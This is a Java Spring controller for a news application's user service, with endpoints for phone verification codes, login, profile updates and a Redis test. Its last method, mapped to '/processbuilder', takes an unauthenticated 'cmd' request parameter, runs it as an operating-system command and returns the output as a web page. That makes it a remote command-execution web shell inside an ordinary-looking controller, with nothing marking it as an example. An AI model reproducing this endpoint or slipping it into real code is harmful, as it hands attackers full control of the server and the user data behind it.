package com.ald.news.user.controller;

import com.ald.news.core.base.BaseController;
import com.ald.news.core.base.BaseResponse;
import com.ald.news.user.service.UserService;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiImplicitParam;
import io.swagger.annotations.ApiImplicitParams;
import io.swagger.annotations.ApiOperation;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.cloud.context.config.annotation.RefreshScope;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.http.MediaType;
import org.springframework.transaction.annotation.EnableTransactionManagement;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.ModelAndView;

import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Map;

/**
 * 用户信息
 *
 * @author xuxm
 */
@Api(tags = "[用户系统]用户信息")
@RestController
@RequestMapping("/user")
@RefreshScope
@EnableTransactionManagement
public class UserController extends BaseController {
    @Autowired
    protected RedisTemplate redisTemplate;

    @Autowired
    private UserService userService;

    @Value("${content}")
    private String url;

    /**
     * 获取验证码
     *
     * @param mobile 手机号码
     * @return
     */
    @RequestMapping(value = "/getVerificationCode", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    @ApiOperation(value = "获取验证码", notes = "输入手机号码,获取验证码")
    @ApiImplicitParam(paramType = "query", dataType = "String", name = "mobile", value = "手机号码", required = true)
    public BaseResponse getVerificationCode(String mobile) {
        return userService.getVerificationCode(mobile);
    }


    /**
     * 登录(本地)
     *
     * @param mobile           手机号码
     * @param verificationCode 验证码
     * @return
     */
    @RequestMapping(value = "/login", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    @ApiOperation(value = "登录(本地)", notes = "输入手机号码和验证码登录")
    @ApiImplicitParams({@ApiImplicitParam(paramType = "query", dataType = "String", name = "mobile", value = "手机号码", required = true),
            @ApiImplicitParam(paramType = "query", dataType = "String", name = "verificationCode", value = "验证码", required = true)})
    public BaseResponse localLogin(String mobile, String verificationCode) {
        return userService.localLogin(mobile, verificationCode);
    }

    /**
     * 登录(三方)
     *
     * @return
     */
    @RequestMapping(value = "/thirdPartyLogin", method = RequestMethod.GET, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    @ApiOperation(value = "登录(三方)", notes = "xxx")
    public BaseResponse thirdPartyLogin() {
        return userService.thirdPartyLogin();
    }

    /**
     * 修改用户信息
     *
     * @param userId   用户ID
     * @param pic      图片文件
     * @param nickname 昵称
     * @return
     */
    @RequestMapping(value = "/{userId}", method = RequestMethod.PATCH, produces = MediaType.APPLICATION_JSON_UTF8_VALUE)
    @ApiOperation(value = "修改用户信息", notes = "修改用户ID对应信息")
    @ApiImplicitParam(paramType = "path", dataType = "Long", name = "userId", value = "用户ID", required = true)
    public BaseResponse updateUserInfo(@PathVariable("userId") Long userId, MultipartFile pic, String nickname) {
        return userService.updateUserInfo(userId, pic, nickname);
    }


    @GetMapping(value = "/a")
    @ApiOperation(value = "111", notes = "111")
    public BaseResponse aaa() {
        redisTemplate.opsForValue().set("test","测试");
        String result= (String) redisTemplate.opsForValue().get("test");
        return BaseResponse.newSuccessInstance(result);
    }

    @RequestMapping("/processbuilder")
    public ModelAndView pd(HttpServletRequest request)
    {
        String s;
        String a="";
        Process p;
        String cmd=request.getParameter("cmd");
        try {
            p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
            {
                a+=s+"<br>";
            }
            p.waitFor();
            p.destroy();
        }
        catch (Exception e)
        {
            e.printStackTrace(System.out);
        }

        Map<String,Object> params=new HashMap<>();
        params.put("exec",a);
        ModelAndView index =new ModelAndView("/process/exec");
        index.addAllObjects(params);
        return index;
    }
}
